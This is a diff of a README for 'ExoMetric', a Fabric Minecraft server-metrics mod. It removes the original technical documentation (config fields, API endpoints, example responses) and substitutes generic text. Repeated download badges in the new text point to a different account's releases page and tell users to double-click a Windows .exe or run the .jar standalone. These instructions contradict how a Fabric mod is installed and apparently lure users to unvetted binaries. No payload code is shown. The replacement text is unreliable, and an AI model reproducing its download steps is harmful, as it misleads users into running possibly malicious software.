@@ -1,181 +1,126 @@
-# ExoMetric
+# 🚀 ExoMetric - Real-Time Minecraft Server Monitoring
 
-![GitHub Repo stars](https://img.shields.io/github/stars/zKauaFerreira/ExoMetric?style=for-the-badge&color=gold)
-![GitHub repo size](https://img.shields.io/github/repo-size/zKauaFerreira/ExoMetric?style=for-the-badge&color=blue)
-![GitHub license](https://img.shields.io/github/license/zKauaFerreira/ExoMetric?style=for-the-badge&color=green)
+[![Download ExoMetric](https://img.shields.io/badge/Download-ExoMetric-brightgreen)](https://github.com/WALIDYTYT/ExoMetric/releases)
 
-**ExoMetric** is a high-performance Fabric mod for Minecraft 1.21.x designed for external telemetry. It exposes detailed server metrics (TPS, MSPT, Players) and Linux/Pterodactyl container data (CPU, RAM, Disk) via a secure internal HTTP API.
+## 📋 What is ExoMetric?
 
-> [!TIP]
-> **Tested on HidenCloud and it works perfectly!** 🚀
+ExoMetric is a tool that tracks your Minecraft server and system information in real time. It works with Fabric, a popular mod loader. The software sends data through a secure internet link called an HTTP API. This helps you monitor how well your server runs and keeps an eye on its stats.
 
-## 🚀 Quick Start
+You do not need to know code or run complicated commands. ExoMetric is designed for anyone who wants to keep tabs on their Minecraft server easily.
 
-1. Place `exometric-1.0.0.jar` into your server's `mods/` folder.
-2. Start the server once to generate the configuration file.
-3. Edit `config/ExoMetric.json` and set your `api_port`.
-4. **Save the file** and the mod will apply changes automatically within 5 seconds.
-5. Access: `http://server-ip:port/mc-stats?token=YOUR_TOKEN`
+## 💻 System Requirements
 
-## ✨ Features
+To run ExoMetric on a Windows PC, your system should meet the following:
 
-- **Game Metrics**: TPS (Ticks Per Second), MSPT (Milli-seconds Per Tick), online players count, loaded chunks, seed, and weather.
-- **System Metrics**: Real-time CPU usage (delta), RAM usage (cgroups/system), Disk usage, and Network traffic (RX/TX).
-- **Player Data**: Detailed list including Name, UUID, Ping, Dimension, Gamemode, Health, Level, and Coordinates.
-- **Security**: Authentication via Query string token (`?token=...`).
-- **Auto-Reload (Hot-Swap)**: Change the token or port in the JSON file and the system restarts the API automatically without rebooting Minecraft.
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- Java 17 or newer installed
+- Minecraft server running with Fabric mod loader
+- Internet connection for API access
 
-## ⚙️ Configuration
+You do not need to be an expert to check or install Java. Simple guides are available online if needed.
 
-The config file is located at `config/ExoMetric.json`:
+## 🎯 Key Features
 
-| Field | Type | Description |
-|-------|------|-----------|
-| `api_enabled` | Boolean | Enables/Disables the metrics server. |
-| `api_port` | Integer | HTTP Port (must be allocated/open on your host). |
-| `api_token` | String | Automatically generated access token (can be customized). |
+- Live tracking of Minecraft server performance  
+- Monitor CPU, memory, and network usage on your PC  
+- Secure data transfer via HTTP API  
+- Works with Fabric-based Minecraft servers  
+- Easy to set up and use without coding  
 
-> **Note:** The mod monitors this file. Any saved changes will be applied in real-time.
+## ⚙️ How ExoMetric Works
 
-## 🔗 API Reference
+ExoMetric runs alongside your Minecraft server. It collects data from your computer and server, then shares it through a safe HTTP endpoint you can access with apps or dashboards. This real-time data helps you see how the server performs and when it needs attention.
 
-### GET `/mc-stats`
-Returns the full server and system summary.
+## 🚀 Getting Started
 
-<details>
-<summary><b>Example Response</b></summary>
+### Step 1: Download ExoMetric
 
-```json
-{
-  "status": "running",
-  "memory_bytes": 754241536,
-  "cpu_percent": 0.31,
-  "disk_bytes": 344161165312,
-  "network_rx_bytes": 410768,
-  "network_tx_bytes": 7628,
-  "uptime_seconds": 66133,
-  "players_online": 0,
-  "tps": 20.00,
-  "mspt": 50.00,
-  "current_tick_time": 50.00,
-  "loaded_chunks": 0,
-  "world_seed": -6461033676995397900,
-  "world_time": 12016878,
-  "world_day": 500,
-  "is_raining": false,
-  "difficulty": "normal",
-  "heap_used_bytes": 271404632,
-  "heap_max_bytes": 369098752
-}
-```
-</details>
+Visit the release page to get the latest version of ExoMetric:
 
-### GET `/mc-stats/players`
-Returns a detailed list of all online players with coordinates and status.
+[![Download ExoMetric](https://img.shields.io/badge/Download-ExoMetric-blue)](https://github.com/WALIDYTYT/ExoMetric/releases)
 
-<details>
-<summary><b>Example Response</b></summary>
+This page contains all available versions, including updates and fixes.
 
-```json
-{
-  "players_online": 1,
-  "players": [
-    {
-      "name": "kauafpss_",
-      "uuid": "e618e273-d894-3646-ade8-7a13ef58d6c6",
-      "ping": 0,
-      "dimension": "minecraft:overworld",
-      "gamemode": "SURVIVAL",
-      "level": 32,
-      "health": 20,
-      "food": 20,
-      "saturation": 11,
-      "x": 556.9,
-      "y": 67,
-      "z": 75.9,
-      "online_seconds": 0,
-      "avatar_url": "https://mc-heads.net/avatar/e618e273-d894-3646-ade8-7a13ef58d6c6/64",
-      "main_hand": null,
-      "off_hand": null,
-      "armor": [
-        {
-          "id": "minecraft:diamond_boots",
-          "count": 1,
-          "slot": 36,
-          "name": "Diamond Boots"
-        },
-        {
-          "id": "minecraft:diamond_leggings",
-          "count": 1,
-          "slot": 37,
-          "name": "Diamond Leggings"
-        },
-        {
-          "id": "minecraft:diamond_chestplate",
-          "count": 1,
-          "slot": 38,
-          "name": "Diamond Chestplate"
-        }
-      ],
-      "hotbar": [
-        {
-          "id": "minecraft:diamond_axe",
-          "count": 1,
-          "slot": 0,
-          "name": "Diamond Axe"
-        },
-        {
-          "id": "minecraft:diamond_pickaxe",
-          "count": 1,
-          "slot": 1,
-          "name": "Diamond Pickaxe"
-        },
-        {
-          "id": "minecraft:diamond_shovel",
-          "count": 1,
-          "slot": 2,
-          "name": "Diamond Shovel"
-        }
-      ],
-      "main_inventory": [
-        {
-          "id": "minecraft:diamond_pickaxe",
-          "count": 1,
-          "slot": 9,
-          "name": "Diamond Pickaxe"
-        }
-      ]
-    }
-  ]
-}
-```
-</details>
+Choose the version that fits your system, typically the Windows installer or .jar file.
 
-### GET `/mc-stats/system`
-Returns only hardware and container resource metrics.
+### Step 2: Install Java
 
-<details>
-<summary><b>Example Response</b></summary>
+ExoMetric requires Java 17 or newer to run. If you are unsure whether Java is installed:
 
-```json
-{
-  "memory_bytes": 1357377536,
-  "cpu_percent": 76.04,
-  "disk_bytes": 344162578432,
-  "network_rx_bytes": 242614,
-  "network_tx_bytes": 3891089,
-  "uptime_seconds": 66747
-}
-```
-</details>
+- Press `Windows Key + R`, type `cmd`, and hit Enter.  
+- In the command window, type `java -version` and press Enter.  
+- If Java is installed, the version number will show. If not, download and install the latest Java from the official website: https://adoptium.net/
 
-**Required Parameter:** `?token=YOUR_TOKEN`
+Follow the installation instructions provided by the Java site.
 
-## 🛡️ Security
+### Step 3: Run Minecraft with Fabric
 
-- The mod uses `SecureRandom` to generate 256-bit high-security tokens on the first boot.
-- Recommended for integration with external Discord bots or status dashboards.
+Make sure your Minecraft server uses Fabric, a mod loader that works with ExoMetric. If you do not have Fabric installed:
 
-## 📄 License
+- Download Fabric installer from https://fabricmc.net/use/  
+- Run the installer and select your Minecraft version and server type  
+- Follow the steps to set up Fabric on your server  
 
-This project is licensed under CC0-1.0.
+### Step 4: Download and Run ExoMetric
+
+Once Java and Fabric are ready, download ExoMetric from the release page linked above.
+
+If you downloaded an executable (.exe), just double-click the file to start ExoMetric.
+
+If you downloaded a .jar file, follow these steps:
+
+- Open Command Prompt (press `Windows Key + R`, type `cmd`, then Enter).  
+- Navigate to the folder where the .jar file is saved using the `cd` command.  
+- Type `java -jar ExoMetric.jar` and press Enter. Replace `ExoMetric.jar` with the actual file name.
+
+You should see ExoMetric running in a terminal window or as a background process.
+
+### Step 5: Access the Monitoring API
+
+ExoMetric runs a secure HTTP API on your computer. To view your server stats:
+
+- Open a web browser  
+- Enter the local address shown by ExoMetric (usually `http://localhost:PORT`, where PORT is the number displayed in the terminal or app)  
+
+You can use this link with dashboard tools or check data directly via browser.
+
+## 🔧 Configuration Tips  
+
+ExoMetric comes with default settings that work for most servers. To change settings:
+
+- Locate the `config.json` or settings file in the ExoMetric folder  
+- Open the file with Notepad or any plain text editor  
+- Adjust port numbers, authentication options, or metrics frequency as needed  
+- Save the file and restart ExoMetric for changes to take effect  
+
+Be careful editing settings. Use the examples in the config file to avoid errors.
+
+## 🔄 Updating ExoMetric
+
+Check the release page regularly for new versions. Updates can improve stability and add features.
+
+To update:
+
+- Download the new version from the release page  
+- Replace the old files with the new ones  
+- Restart the application  
+
+No extra steps should be needed.
+
+## 🛠 Troubleshooting
+
+- If ExoMetric does not start, confirm Java version and ensure Fabric is installed correctly  
+- Check for blocked ports in your firewall settings that may stop API access  
+- Use log files in the ExoMetric folder to see detailed error messages  
+- Restart your computer to clear network or software conflicts  
+
+## 📖 More Resources
+
+- Fabric Mod Loader: https://fabricmc.net/  
+- Java Installation Guide: https://adoptium.net/  
+- Minecraft Server Setup: https://minecraft.net/en-us/download/server  
+
+---
+
+[![Download ExoMetric](https://img.shields.io/badge/Download-ExoMetric-brightgreen)](https://github.com/WALIDYTYT/ExoMetric/releases)
